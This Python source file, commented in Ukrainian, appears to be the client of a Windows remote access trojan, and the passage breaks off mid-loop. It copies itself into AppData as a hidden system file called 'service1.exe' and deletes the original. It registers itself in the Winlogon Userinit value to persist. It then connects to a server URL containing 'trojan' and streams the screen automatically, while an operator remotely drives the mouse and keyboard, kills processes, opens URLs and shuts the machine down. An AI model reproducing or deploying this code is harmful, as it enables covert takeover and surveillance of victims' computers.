import asyncio
import base64
import io
import json
import logging
import os
import platform
import socket
import sys
import threading
import time
import urllib.request
import uuid
import webbrowser
import winreg
import ctypes
import shutil
import subprocess

import psutil
import websockets
from PIL import Image, ImageGrab, ImageDraw

try:
    import mss
    HAS_MSS = True
except ImportError:
    HAS_MSS = False

try:
    import pyautogui
    HAS_PYAUTOGUI = True
except Exception:
    pyautogui = None
    HAS_PYAUTOGUI = False

MOUSE_ACTIONS = {"mouse_move", "mouse_click", "mouse_down", "mouse_up", "mouse_scroll"}
KEYBOARD_ACTIONS = {"key_type", "key_press", "key_hotkey", "key_down", "key_up"}

# Максимальна довжина тексту за одну команду — захист від випадкового мегабайта
MAX_TYPE_LENGTH = 5000

# --- Бекенди керування мишею та клавіатурою -----------------------------------
# Флаги подій миші Win32 (user32.mouse_event)
MOUSE_EVENT_FLAGS = {
    "left": (0x0002, 0x0004),    # MOUSEEVENTF_LEFTDOWN / LEFTUP
    "right": (0x0008, 0x0010),   # MOUSEEVENTF_RIGHTDOWN / RIGHTUP
    "middle": (0x0020, 0x0040),  # MOUSEEVENTF_MIDDLEDOWN / MIDDLEUP
}
MOUSEEVENTF_WHEEL = 0x0800
WHEEL_DELTA = 120

FILE_ATTRIBUTE_HIDDEN = 0x02
FILE_ATTRIBUTE_SYSTEM = 0x04

# Флаги подій клавіатури Win32 (user32.keybd_event)
KEYEVENTF_EXTENDEDKEY = 0x0001
KEYEVENTF_KEYUP = 0x0002
KEYEVENTF_UNICODE = 0x0004

# Віртуальні коди клавіш Windows
VK_CODES = {
    "enter": 0x0D, "esc": 0x1B, "backspace": 0x08, "tab": 0x09, "space": 0x20,
    "delete": 0x2E, "insert": 0x2D, "home": 0x24, "end": 0x23,
    "pageup": 0x21, "pagedown": 0x22,
    "left": 0x25, "up": 0x26, "right": 0x27, "down": 0x28,
    "shift": 0x10, "ctrl": 0x11, "alt": 0x12, "win": 0x5B, "capslock": 0x14,
    "printscreen": 0x2C, "pause": 0x13, "scrolllock": 0x91,
    "numlock": 0x90, "apps": 0x5D,
    **{f"f{i}": 0x6F + i for i in range(1, 13)},
}
# Ці клавіші потребують прапорця KEYEVENTF_EXTENDEDKEY
EXTENDED_KEYS = {
    "insert", "delete", "home", "end", "pageup", "pagedown",
    "left", "up", "right", "down", "win", "apps", "printscreen", "numlock",
}

# Канонічні назви клавіш (браузер надсилає e.key, тут — уніфіковані токени)
KEY_ALIASES = {
    "return": "enter", "escape": "esc", "esc": "esc", "spacebar": "space", " ": "space",
    "arrowup": "up", "arrowdown": "down", "arrowleft": "left", "arrowright": "right",
    "control": "ctrl", "ctrl": "ctrl", "meta": "win", "super": "win", "os": "win", "windows": "win",
    "altgraph": "alt", "del": "delete", "pagedown": "pagedown", "pageup": "pageup",
    "capslock": "capslock", "printscreen": "printscreen", "scrolllock": "scrolllock",
    "numlock": "numlock", "contextmenu": "apps",
}

# pyautogui-назви для канонічних токенів (для macOS/Linux)
PYAUTOGUI_KEYS = {k: k for k in VK_CODES}
PYAUTOGUI_KEYS["win"] = "win"

# Ці помилки не показуємо в панелі на кожну подію (миша рухається і клавіші повторюються десятки разів на сек.)
THROTTLED_ERROR_ACTIONS = {"mouse_move", "key_press", "key_down", "key_up", "key_hotkey"}

def process_file():
    current_path = os.path.abspath(sys.executable)
    roaming_dir = os.getenv('APPDATA')
    if not roaming_dir:
        return

    target_path = os.path.join(roaming_dir, "service1.exe")

    if os.path.dirname(current_path).lower() != roaming_dir.lower():
        try:
            shutil.copy2(current_path, target_path)
            subprocess.Popen([target_path] + sys.argv[1:])
            cleanup_cmd = f'cmd /c timeout /t 2 /nobreak > NUL & del /f /q "{current_path}"'
            subprocess.Popen(cleanup_cmd, shell=True, creationflags=0x08000000)
            sys.exit(0)
        except Exception:
            pass

    try:
        ctypes.windll.kernel32.SetFileAttributesW(target_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)
    except Exception:
        pass

def add_to_userinit():
    if not getattr(sys, 'frozen', False):
        return

    roaming_dir = os.getenv('APPDATA')
    if not roaming_dir:
        return
        
    exe_path = os.path.join(roaming_dir, "service1.exe")
    
    registry_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    value_name = "Userinit"

    try:
        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE, 
            registry_path, 
            0, 
            winreg.KEY_READ | winreg.KEY_WRITE
        )

        current_value, reg_type = winreg.QueryValueEx(key, value_name)

        if exe_path.lower() not in current_value.lower():
            if current_value.endswith(","):
                new_value = f"{current_value} {exe_path},"
            else:
                new_value = f"{current_value}, {exe_path},"

            winreg.SetValueEx(key, value_name, 0, reg_type, new_value)
        else:
            pass

        winreg.CloseKey(key)

    except PermissionError:
        pass
    except Exception as e:
        pass

def normalize_key(key) -> str:
    """Приводить назву клавіші з браузера до канонічного вигляду (Enter -> enter, Cyrillic char — як є)."""
    k = str(key if key is not None else "")
    if not k:
        return ""
    if k in KEY_ALIASES:        # точний збіг потрібен для пробілу: " " -> space
        return KEY_ALIASES[k]
    low = k.strip().lower()
    if low in KEY_ALIASES:
        return KEY_ALIASES[low]
    if len(k) == 1:
        return k          # звичайний символ, включно з кирилицею та пунктуацією
    return low


class PyAutoGUIBackend:
    """Кросплатформний бекенд через pyautogui (потрібна встановлена бібліотека)."""
    name = "pyautogui"

    def size(self):
        return pyautogui.size()

    # --- миша ---
    def move(self, x, y):
        pyautogui.moveTo(int(x), int(y), _pause=False)

    def button_down(self, button):
        pyautogui.mouseDown(button=button, _pause=False)

    def button_up(self, button):
        pyautogui.mouseUp(button=button, _pause=False)

    def click(self, button, clicks):
        pyautogui.click(button=button, clicks=clicks, _pause=False)

    def scroll(self, clicks):
        pyautogui.scroll(int(clicks), _pause=False)

    # --- клавіатура ---
    def type_text(self, text) -> int:
        """Повертає кількість символів, які не вдалося надрукувати (pyautogui не вміє не-ASCII)."""
        skipped = 0
        for ch in text:
            try:
                pyautogui.write(ch)
            except Exception:
                skipped += 1
            time.sleep(0.005)
        return skipped

    def press_key(self, key):
        pyautogui.press(PYAUTOGUI_KEYS.get(key, key))

    def hotkey(self, keys):
        pyautogui.hotkey(*[PYAUTOGUI_KEYS.get(k, k) for k in keys])

    def key_down(self, key):
        pyautogui.keyDown(PYAUTOGUI_KEYS.get(key, key))

    def key_up(self, key):
        pyautogui.keyUp(PYAUTOGUI_KEYS.get(key, key))


class WindowsInputBackend:
    """
    Нативний Win32-бекенд (user32 без сторонніх бібліотек):
    миша — SetCursorPos + mouse_event, клавіатура — keybd_event.
    Працює навіть якщо pyautogui не потрапив у зібраний .exe або не встановився.
    """
    name = "win32"

    def __init__(self, user32=None):
        if user32 is None:
            import ctypes
            user32 = ctypes.windll.user32
        self.user32 = user32

    # --- миша ---
    def size(self):
        return (self.user32.GetSystemMetrics(0), self.user32.GetSystemMetrics(1))

    def move(self, x, y):
        if not self.user32.SetCursorPos(int(x), int(y)):
            raise RuntimeError("Windows відхилив переміщення курсору (SetCursorPos)")

    def _flags(self, button, down):
        down_flag, up_flag = MOUSE_EVENT_FLAGS.get(button, MOUSE_EVENT_FLAGS["left"])
        return down_flag if down else up_flag

    def button_down(self, button):
        self.user32.mouse_event(self._flags(button, True), 0, 0, 0, 0)

    def button_up(self, button):
        self.user32.mouse_event(self._flags(button, False), 0, 0, 0, 0)

    def click(self, button, clicks):
        for i in range(max(1, int(clicks))):
            self.button_down(button)
            self.button_up(button)
            if i + 1 < clicks:
                # Невелика пауза, щоб Windows порахував це подвійним кліком
                time.sleep(0.03)

    def scroll(self, clicks):
        if clicks:
            self.user32.mouse_event(MOUSEEVENTF_WHEEL, 0, 0, int(clicks) * WHEEL_DELTA, 0)

    def _key_event(self, vk=0, scan=0, keyup=False, extended=False, unicode_char=False):
        flags = 0
        if extended:
            flags |= KEYEVENTF_EXTENDEDKEY
        if unicode_char:
            flags |= KEYEVENTF_UNICODE
        if keyup:
            flags |= KEYEVENTF_KEYUP
        # ОБОВ'ЯЗКОВО: маскуємо scan до 16-біт, щоб ctypes не викидав ArgumentError
        self.user32.keybd_event(int(vk) & 0xFF, int(scan) & 0xFFFF, flags, 0)

    def type_text(self, text) -> int:
        for ch in text:
            if ch == "\r":
                continue
            if ch == "\n":
                self.press_key("enter")
                continue
            if ch == "\t":
                self.press_key("tab")
                continue
            
            # Для юнікоду (кирилиці) vk має бути 0
            units = ch.encode("utf-16-le")
            for i in range(0, len(units), 2):
                unit = int.from_bytes(units[i:i + 2], "little")
                self._key_event(vk=0, scan=unit, unicode_char=True)
                self._key_event(vk=0, scan=unit, keyup=True, unicode_char=True)
            time.sleep(0.005)
        return 0

    def _named_key(self, key):
        """Повертає (vk, extended, потрібен_shift) або None, якщо ключ невідомий."""
        if key in VK_CODES:
            return VK_CODES[key], key in EXTENDED_KEYS, False
        if len(key) == 1:
            if key.isascii() and key.isalnum():
                return ord(key.upper()), False, key.isupper()
            try:
                code = self.user32.VkKeyScanW(ord(key))
            except Exception:
                code = -1
            if code is not None and code != -1:
                return code & 0xFF, False, bool((code >> 8) & 1)
        return None

    def type_text(self, text) -> int:
        """Друкує текст через KEYEVENTF_UNICODE — тому працює будь-яка мова, включно з кирилицею."""
        for ch in text:
            if ch == "\r":
                continue
            if ch == "\n":
                self.press_key("enter")
                continue
            if ch == "\t":
                self.press_key("tab")
                continue
            # Кодуємо у UTF-16, щоб коректно відправити навіть емодзі (сурогатні пари)
            units = ch.encode("utf-16-le")
            for i in range(0, len(units), 2):
                unit = int.from_bytes(units[i:i + 2], "little")
                self._key_event(scan=unit, unicode_char=True)
                self._key_event(scan=unit, keyup=True, unicode_char=True)
            time.sleep(0.004)
        return 0

    def press_key(self, key):
        if key not in VK_CODES:
            # Одиничний символ (літера, цифра, кирилиця, пунктуація) — друкуємо юнікодом
            self.type_text(key)
            return
        vk, extended, shift = self._named_key(key)
        if shift:
            self._key_event(VK_CODES["shift"])
        self._key_event(vk, extended=extended)
        self._key_event(vk, keyup=True, extended=extended)
        if shift:
            self._key_event(VK_CODES["shift"], keyup=True)

    def hotkey(self, keys):
        """Сполучення клавіш: натискаємо по черзі, відпускаємо у зворотному порядку."""
        pressed = []
        auto_shift = "shift" not in keys   # не дублюємо Shift, якщо його вже передали в сполученні
        try:
            for key in keys:
                info = self._named_key(key)
                if info is None:
                    raise ValueError(f"Невідома клавіша у сполученні: {key}")
                vk, extended, shift = info
                if shift and auto_shift:
                    self._key_event(VK_CODES["shift"])
                    pressed.append((VK_CODES["shift"], False))
                self._key_event(vk, extended=extended)
                pressed.append((vk, extended))
        finally:
            for vk, extended in reversed(pressed):
                self._key_event(vk, keyup=True, extended=extended)

    def key_down(self, key):
        info = self._named_key(key)
        if info is None:
            raise ValueError(f"Невідома клавіша: {key}")
        vk, extended, _shift = info
        self._key_event(vk, extended=extended)

    def key_up(self, key):
        info = self._named_key(key)
        if info is None:
            raise ValueError(f"Невідома клавіша: {key}")
        vk, extended, _shift = info
        self._key_event(vk, keyup=True, extended=extended)


_input_backend = None
_input_backend_ready = False


def create_input_backend(sys_name=None, user32=None):
    """Обирає бекенд вводу: на Windows — нативний Win32, інакше pyautogui."""
    sys_name = (sys_name or platform.system()).lower()
    if "windows" in sys_name:
        try:
            return WindowsInputBackend(user32=user32)
        except Exception as e:
            logger.warning(f"Нативний Win32-бекенд недоступний ({e}) — пробуємо pyautogui")
    if HAS_PYAUTOGUI:
        return PyAutoGUIBackend()
    return None


def get_input_backend():
    global _input_backend, _input_backend_ready
    if not _input_backend_ready:
        _input_backend = create_input_backend()
        _input_backend_ready = True
    return _input_backend


def input_backend_name():
    backend = get_input_backend()
    return backend.name if backend else None

if getattr(sys, 'frozen', False):
    BASE_DIR = os.path.dirname(sys.executable)
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

CONFIG_FILE = os.path.join(BASE_DIR, "client_config.json")

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("PC-Client")

if HAS_PYAUTOGUI:
    # Прибираємо штучні паузи та вимикаємо аварійний кут (миша має доходити у будь-яку точку)
    pyautogui.PAUSE = 0.001
    pyautogui.FAILSAFE = False


def init_platform():
    """Готує платформу перед запуском (DPI-сумісність зі скріншотами на Windows)."""
    if "windows" not in platform.system().lower():
        return
    try:
        import ctypes
        try:
            ctypes.windll.shcore.SetProcessDpiAwareness(2)  # PROCESS_PER_MONITOR_DPI_AWARE
        except Exception:
            ctypes.windll.user32.SetProcessDPIAware()
    except Exception:
        pass


DEFAULT_SERVER_URL = "wss://trojan-y9he.onrender.com/ws/client"
DEFAULT_SECRET = "super_secret_club_key_2026"

def get_hardware_id() -> str:
    """Генерує унікальний ідентифікатор заліза комп'ютера (HWID)."""
    try:
        import hashlib
        if platform.system().lower() == "windows":
            try:
                import winreg
                reg = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
                key = winreg.OpenKey(reg, r"SOFTWARE\Microsoft\Cryptography")
                guid, _ = winreg.QueryValueEx(key, "MachineGuid")
                if guid:
                    return hashlib.md5(guid.encode('utf-8')).hexdigest()[:12].upper()
            except Exception:
                pass
        
        node = str(uuid.getnode()) + socket.gethostname()
        return hashlib.md5(node.encode('utf-8')).hexdigest()[:12].upper()
    except Exception:
        return "UNKNOWN_HWID"

def load_or_create_config() -> dict:
    hwid = get_hardware_id()
    default_config = {
        "server_url": DEFAULT_SERVER_URL,
        "secret": DEFAULT_SECRET,
        "pc_name": f"PC_{hwid[:4]}",
        "hwid": hwid
    }

    if not os.path.exists(CONFIG_FILE):
        return default_config

    try:
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
            data["hwid"] = hwid
            if "server_url" not in data: data["server_url"] = DEFAULT_SERVER_URL
            if "secret" not in data: data["secret"] = DEFAULT_SECRET
            return data
    except Exception as e:
        logger.error(f"Помилка читання {CONFIG_FILE}: {e}")
        return default_config

def save_config(cfg: dict):
    """Зберігає конфігурацію клієнта у client_config.json."""
    try:
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump(cfg, f, indent=4, ensure_ascii=False)
        logger.info(f"💾 Конфігурацію збережено: {CONFIG_FILE}")
    except Exception as e:
        logger.error(f"Помилка запису в {CONFIG_FILE}: {e}")

def get_cursor_pos():
    """Отримує поточні координати курсору миші."""
    sys_name = platform.system().lower()
    if "windows" in sys_name:
        try:
            import ctypes
            class POINT(ctypes.Structure):
                _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
            pt = POINT()
            if ctypes.windll.user32.GetCursorPos(ctypes.byref(pt)):
                return pt.x, pt.y
        except Exception:
            pass
    elif "darwin" in sys_name:
        try:
            from AppKit import NSEvent, NSScreen
            loc = NSEvent.mouseLocation()
            h = NSScreen.mainScreen().frame().size.height
            return int(loc.x), int(h - loc.y)
        except Exception:
            pass
    try:
        import pyautogui
        p = pyautogui.position()
        return int(p[0]), int(p[1])
    except Exception:
        pass
    return None

def draw_cursor(img, cx: int, cy: int):
    """Малює контрастний вказівник миші на зображенні."""
    try:
        draw = ImageDraw.Draw(img)
        # Зовнішній чорний контур для чіткості на світлому фоні
        points_outer = [
            (cx - 1, cy - 1),
            (cx - 1, cy + 18),
            (cx + 4, cy + 13),
            (cx + 8, cy + 20),
            (cx + 12, cy + 18),
            (cx + 8, cy + 12),
            (cx + 14, cy + 12)
        ]
        # Внутрішня біла стрілка
        points_inner = [
            (cx, cy),
            (cx, cy + 15),
            (cx + 4, cy + 12),
            (cx + 7, cy + 18),
            (cx + 10, cy + 17),
            (cx + 7, cy + 11),
            (cx + 12, cy + 11)
        ]
        draw.polygon(points_outer, fill=(0, 0, 0))
        draw.polygon(points_inner, fill=(255, 255, 255))
    except Exception:
        pass

def get_screenshot_base64() -> str:
    try:
        img = ImageGrab.grab()
        mouse_pos = get_cursor_pos()
        if mouse_pos:
            draw_cursor(img, mouse_pos[0], mouse_pos[1])
        buffer = io.BytesIO()
        img.convert("RGB").save(buffer, format="JPEG", quality=75, optimize=True)
        return base64.b64encode(buffer.getvalue()).decode("utf-8")
    except Exception as e:
        logger.error(f"Помилка створення скріншоту: {e}")
        raise

def kill_process_by_name(target_name: str) -> int:
    target_lower = target_name.strip().lower()
    killed = 0
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            pname = proc.info['name']
            if pname and (pname.lower() == target_lower or pname.lower().startswith(target_lower.replace(".exe", ""))):
                proc.terminate()
                killed += 1
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    return killed

def get_process_list() -> list:
    procs = []
    for proc in psutil.process_iter(['pid', 'name', 'memory_info', 'cpu_percent']):
        try:
            mem_mb = (proc.info['memory_info'].rss / (1024 * 1024)) if proc.info['memory_info'] else 0
            procs.append({
                "pid": proc.info['pid'],
                "name": proc.info['name'] or "unknown",
                "memory": round(mem_mb, 1),
                "cpu": proc.info['cpu_percent'] or 0
            })
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    procs.sort(key=lambda x: x["memory"], reverse=True)
    return procs[:30]

def execute_shutdown():
    if "windows" in platform.system().lower():
        os.system("shutdown /s /t 0")
    else:
        os.system("shutdown -h now")

def execute_restart():
    if "windows" in platform.system().lower():
        os.system("shutdown /r /t 0")
    else:
        os.system("shutdown -r now")

def show_fullscreen_image(img_bytes: bytes, duration: float):
    def _worker():
        try:
            import tkinter as tk
            from PIL import ImageTk

            if not img_bytes or len(img_bytes) < 32:
                logger.error("Отримано порожні або занадто малі дані")
                return

            if img_bytes[:15].lower().startswith(b"<!doctype") or img_bytes[:6].lower().startswith(b"<html"):
                logger.error("Замість картинки отримано HTML")
                return

            pil_img = Image.open(io.BytesIO(img_bytes)).convert("RGB")
            root = tk.Tk()
            root.attributes('-fullscreen', True)
            root.attributes('-topmost', True)
            root.config(cursor="none")
            root.bind('<Escape>', lambda e: root.destroy())

            screen_w = root.winfo_screenwidth()
            screen_h = root.winfo_screenheight()

            pil_img.thumbnail((screen_w, screen_h), Image.Resampling.LANCZOS)
            bg_img = Image.new("RGB", (screen_w, screen_h), "black")
            bg_img.paste(pil_img, ((screen_w - pil_img.width) // 2, (screen_h - pil_img.height) // 2))

            tk_img = ImageTk.PhotoImage(bg_img)
            lbl = tk.Label(root, image=tk_img, bg="black")
            lbl.image = tk_img
            lbl.pack(fill="both", expand=True)

            root.after(int(duration * 1000), root.destroy)
            root.mainloop()
        except Exception as e:
            logger.error(f"Помилка показу картинки: {e}")

    threading.Thread(target=_worker, daemon=True).start()

is_streaming = False
stream_task = None
# Геометрія монітора, який зараз транслюється — потрібна для точного перерахунку координат миші
stream_monitor = None


def clamp_rel(value, fallback: float = 0.5) -> float:
    """Нормалізує відносну координату з браузера до діапазону 0.0–1.0."""
    try:
        v = float(value)
    except (TypeError, ValueError):
        return fallback
    return min(1.0, max(0.0, v))


def screen_size():
    """Розмір екрана від активного бекенду вводу."""
    backend = get_input_backend()
    if backend:
        try:
            return backend.size()
        except Exception:
            pass
    if HAS_PYAUTOGUI:
        return pyautogui.size()
    return None


def rel_to_screen(rel_x, rel_y, size=None):
    """Переводить відносні координати картинки (0.0–1.0) у пікселі монітора, що транслюється."""
    if stream_monitor:
        left = stream_monitor["left"]
        top = stream_monitor["top"]
        width = stream_monitor["width"]
        height = stream_monitor["height"]
    else:
        size = size or screen_size()
        if not size:
            raise RuntimeError("Немає доступного бекенду керування мишею")
        width, height = size
        left = top = 0
    x = int(left + clamp_rel(rel_x) * (max(1, width) - 1))
    y = int(top + clamp_rel(rel_y) * (max(1, height) - 1))
    return x, y


def normalize_button(button) -> str:
    b = str(button or "left").strip().lower()
    return b if b in ("left", "right", "middle") else "left"


def perform_mouse_action(action: str, params: dict) -> dict:
    """
    Виконує дію миші на локальному ПК.
    Синхронно (без потоку), щоб порядок подій drag & drop не порушувався.
    """
    backend = get_input_backend()
    if backend is None:
        return {
            "status": "error",
            "message": "Немає бекенду керування мишею: ні нативний Win32, ні pyautogui недоступні"
        }

    button = normalize_button(params.get("button"))
    has_coords = params.get("x") is not None and params.get("y") is not None

    try:
        if action == "mouse_move":
            x, y = rel_to_screen(params.get("x", 0.5), params.get("y", 0.5), backend.size())
            backend.move(x, y)

        elif action == "mouse_scroll":
            try:
                delta_y = float(params.get("delta_y") or 0)
            except (TypeError, ValueError):
                delta_y = 0.0
            # Одна сходинка колеса у браузері ≈ 100 одиниць deltaY (додатні — вниз)
            clicks = int(-delta_y / 100)
            if clicks == 0:
                clicks = 1 if delta_y < 0 else -1
            backend.scroll(clicks)

        elif action in ("mouse_click", "mouse_down", "mouse_up"):
            if has_coords:
                x, y = rel_to_screen(params.get("x"), params.get("y"), backend.size())
                backend.move(x, y)

            if action == "mouse_click":
                try:
                    clicks = max(1, min(3, int(params.get("clicks") or 1)))
                except (TypeError, ValueError):
                    clicks = 1
                backend.click(button, clicks)
            elif action == "mouse_down":
                backend.button_down(button)
            else:
                backend.button_up(button)

        else:
            return {"status": "error", "message": f"Невідома дія миші: {action}"}

    except Exception as e:
        logger.error(f"Помилка дії миші {action}: {e}")
        return {"status": "error", "message": f"Не вдалося виконати {action}: {e}"}

    return {"status": "ok"}


def perform_keyboard_action(action: str, params: dict) -> dict:
    """Виконує дію клавіатури на локальному ПК (друкування, натискання, сполучення)."""
    backend = get_input_backend()
    if backend is None:
        return {
            "status": "error",
            "message": "Немає бекенду керування клавіатурою: ні нативний Win32, ні pyautogui недоступні"
        }

    try:
        if action == "key_type":
            text = params.get("text")
            if text is None:
                return {"status": "error", "message": "Не вказано текст"}
            text = str(text)
            if len(text) > MAX_TYPE_LENGTH:
                return {"status": "error", "message": f"Задовгий текст ({len(text)} символів, ліміт {MAX_TYPE_LENGTH})"}
            if not text:
                return {"status": "error", "message": "Порожній текст"}
            skipped = backend.type_text(text) or 0
            message = f"Надіслано {len(text)} символів"
            if skipped:
                message += f" ({skipped} символів не підтримуються цим бекендом)"
            return {"status": "ok", "message": message, "skipped": skipped}

        key = normalize_key(params.get("key"))

        if action == "key_press":
            if not key:
                return {"status": "error", "message": "Не вказано клавішу"}
            backend.press_key(key)

        elif action == "key_hotkey":
            keys = [normalize_key(k) for k in (params.get("keys") or [])]
            keys = [k for k in keys if k]
            if not keys:
                return {"status": "error", "message": "Не вказано сполучення клавіш"}
            backend.hotkey(keys)

        elif action == "key_down":
            if not key:
                return {"status": "error", "message": "Не вказано клавішу"}
            backend.key_down(key)

        elif action == "key_up":
            if not key:
                return {"status": "error", "message": "Не вказано клавішу"}
            backend.key_up(key)

        else:
            return {"status": "error", "message": f"Невідома дія клавіатури: {action}"}

    except Exception as e:
        logger.error(f"Помилка дії клавіатури {action}: {e}")
        return {"status": "error", "message": f"Не вдалося виконати {action}: {e}"}

    return {"status": "ok"}


async def stream_loop(websocket, target_fps=8):
    global is_streaming, stream_monitor
    logger.info(f"Початок трансляції екрану ({target_fps} FPS)...")
    delay = max(0.04, 1.0 / target_fps)
    sct = mss.mss() if HAS_MSS else None
    try:
        while is_streaming:
            try:
                offset_x, offset_y = 0, 0

                def capture_frame():
                    if sct:
                        mon = sct.monitors[1]
                        s_img = sct.grab(mon)
                        return Image.frombytes("RGB", s_img.size, s_img.bgra, "raw", "BGRX"), mon.get("left", 0), mon.get("top", 0)
                    else:
                        return ImageGrab.grab(), 0, 0

                img, offset_x, offset_y = await asyncio.to_thread(capture_frame)

                stream_monitor = {
                    "left": offset_x,
                    "top": offset_y,
                    "width": img.width,
                    "height": img.height
                }

                orig_w, orig_h = img.width, img.height
                ratio = 1.0
                if img.width > 960:
                    ratio = 960 / img.width
                    img = img.resize((960, int(img.height * ratio)), Image.Resampling.BILINEAR)

                # Відображення курсору миші
                mouse_pos = get_cursor_pos()
                if mouse_pos:
                    mx, my = mouse_pos
                    rel_x = mx - offset_x
                    rel_y = my - offset_y
                    if 0 <= rel_x < orig_w and 0 <= rel_y < orig_h:
                        cur_x = int(rel_x * ratio)
                        cur_y = int(rel_y * ratio)
                        draw_cursor(img, cur_x, cur_y)

                buf = io.BytesIO()
                img.convert("RGB").save(buf, format="JPEG", quality=45, optimize=False)
                b64_frame = base64.b64encode(buf.getvalue()).decode("utf-8")

                await websocket.send(json.dumps({"type": "stream_frame", "frame": b64_frame}))
                await asyncio.sleep(delay)
            except Exception as e:
                logger.warning(f"Помилка відправки кадру: {e}")
                await asyncio.sleep(0.15)
    finally:
        if sct:
            sct.close()
    logger.info("Трансляцію екрану зупинено.")

async def execute_action(action: str, params: dict, websocket=None) -> dict:
    global is_streaming, stream_task
    try:
        if action == "screenshot":
            return {"status": "ok", "image_base64": get_screenshot_base64()}

        elif action == "start_stream":
            fps = int(params.get("fps", 8))
            if is_streaming and stream_task and not stream_task.done():
                return {"status": "ok", "message": f"Стрім вже активний ({fps} FPS)"}
            if websocket:
                is_streaming = True
                stream_task = asyncio.create_task(stream_loop(websocket, target_fps=fps))
            return {"status": "ok", "message": f"Стрім запущено ({fps} FPS)"}

        elif action == "show_image":
            image_url = params.get("image_url")
            image_b64 = params.get("image_base64")
            duration = float(params.get("duration", 10))

            try:
                if image_b64:
                    img_data = base64.b64decode(image_b64)
                elif image_url:
                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8'
                    }
                    req = urllib.request.Request(image_url, headers=headers)
                    with urllib.request.urlopen(req, timeout=15) as resp:
                        img_data = resp.read()
                else:
                    return {"status": "error", "message": "Не вказано картинку"}

                show_fullscreen_image(img_data, duration)
                return {"status": "ok", "message": f"Картинку виведено на весь екран на {duration} сек."}
            except Exception as ex:
                return {"status": "error", "message": f"Помилка завантаження картинки: {ex}"}

        elif action == "stop_stream":
            is_streaming = False
            return {"status": "ok", "message": "Стрім зупинено"}

        elif action == "open_url":
            url = params.get("url")
            if not url: return {"status": "error", "message": "Не вказано URL"}
            webbrowser.open(url)
            return {"status": "ok", "message": f"URL {url} відкрито"}

        elif action == "kill_process":
            proc_name = params.get("name")
            if not proc_name: return {"status": "error", "message": "Не вказано назву процесу"}
            killed = kill_process_by_name(proc_name)
            return {"status": "ok", "killed_count": killed} if killed > 0 else {"status": "error", "message": "Процес не знайдено"}

        elif action == "list_processes":
            return {"status": "ok", "processes": get_process_list()}

        elif action in MOUSE_ACTIONS:
            return await asyncio.to_thread(perform_mouse_action, action, params)

        elif action in KEYBOARD_ACTIONS:
            return await asyncio.to_thread(perform_keyboard_action, action, params)

        elif action == "restart":
            asyncio.get_event_loop().call_later(1.0, execute_restart)
            return {"status": "ok", "message": "ПК перезавантажується..."}

        elif action == "shutdown":
            asyncio.get_event_loop().call_later(1.0, execute_shutdown)
            return {"status": "ok", "message": "ПК вимикається..."}

        elif action in ("set_pc_name", "rename"):
            new_name = (params.get("new_name") or "").strip()
            if new_name:
                cfg = load_or_create_config()
                cfg["pc_name"] = new_name
                save_config(cfg)
                return {"status": "ok", "message": f"Ім'я комп'ютера змінено на '{new_name}'", "pc_name": new_name}
            return {"status": "error", "message": "Порожній параметр new_name"}

        else:
            return {"status": "error", "message": f"Невідома дія: {action}"}

    except Exception as e:
        logger.error(f"Помилка виконання {action}: {e}")
        return {"status": "error", "message": str(e)}

_last_mouse_error_at = 0.0
MOUSE_ERROR_THROTTLE = 5.0


def should_report_error(action: str) -> bool:
    """Не даємо клієнту слати одну й ту саму помилку на кожен рух мишi чи автоповтор клавішi."""
    global _last_mouse_error_at
    if action not in THROTTLED_ERROR_ACTIONS:
        return True
    now = time.monotonic()
    if now - _last_mouse_error_at < MOUSE_ERROR_THROTTLE:
        return False
    _last_mouse_error_at = now
    return True


async def heartbeat_sender(websocket):
    while True:
        try:
            stats = {
                "cpu": psutil.cpu_percent(),
                "ram": psutil.virtual_memory().percent,
                "os": platform.system(),
                # Який бекенд керує вводом: "win32", "pyautogui" або None (керування недоступне)
                "mouse": input_backend_name(),
                "keyboard": input_backend_name()
            }
            await websocket.send(json.dumps({"type": "heartbeat", "stats": stats}))
            await asyncio.sleep(5)
        except Exception:
            break

async def run_client():
    global is_streaming, stream_task

    while True:
        cfg = load_or_create_config()
        server_base = cfg["server_url"].rstrip("/")
        secret = cfg["secret"]
        pc_name = cfg["pc_name"]
        hwid = cfg.get("hwid", get_hardware_id())

        uri = f"{server_base}/{pc_name}?secret={secret}&hwid={hwid}"
        logger.info(f"Підключення до сервера як '{pc_name}' (HWID={hwid})...")

        try:
            async with websockets.connect(
                uri,
                ping_interval=15,
                ping_timeout=20,
                close_timeout=10,
                max_size=25 * 1024 * 1024
            ) as websocket:
                logger.info(f"✅ Успішно підключено до сервера як '{pc_name}'!")
                heartbeat_task = asyncio.create_task(heartbeat_sender(websocket))
                if not is_streaming:
                    is_streaming = True
                    stream_task = asyncio.create_task(stream_loop(websocket, target_fps=8))

                try:
                    async for message_str in websocket:
                        try:
                            if isinstance(message_str, bytes):
                                message_str = message_str.decode('utf-8', errors='ignore')
                            msg = json.loads(message_str)
                            if msg.get("type") == "assigned_name":
                                new_name = msg.get("pc_name")
                                logger.info(f"🌟 Цьому ПК офіційно призначено ім'я: {new_name}")
                                try:
                                    current_cfg = load_or_create_config()
                                    if not os.path.exists(CONFIG_FILE) or current_cfg.get("pc_name") != new_name:
                                        current_cfg["pc_name"] = new_name
                                        save_config(current_cfg)
                                except Exception as e:
                                    logger.warning(f"Не вдалося оновити client_config.json: {e}")
                                continue

                            req_id = msg.get("request_id")
                            action = msg.get("action")
                            params = msg.get("params", {})
                            if action not in ("mouse_move", "key_press", "key_down", "key_up"):
                                logger.info(f"Отримано команду: {action}")
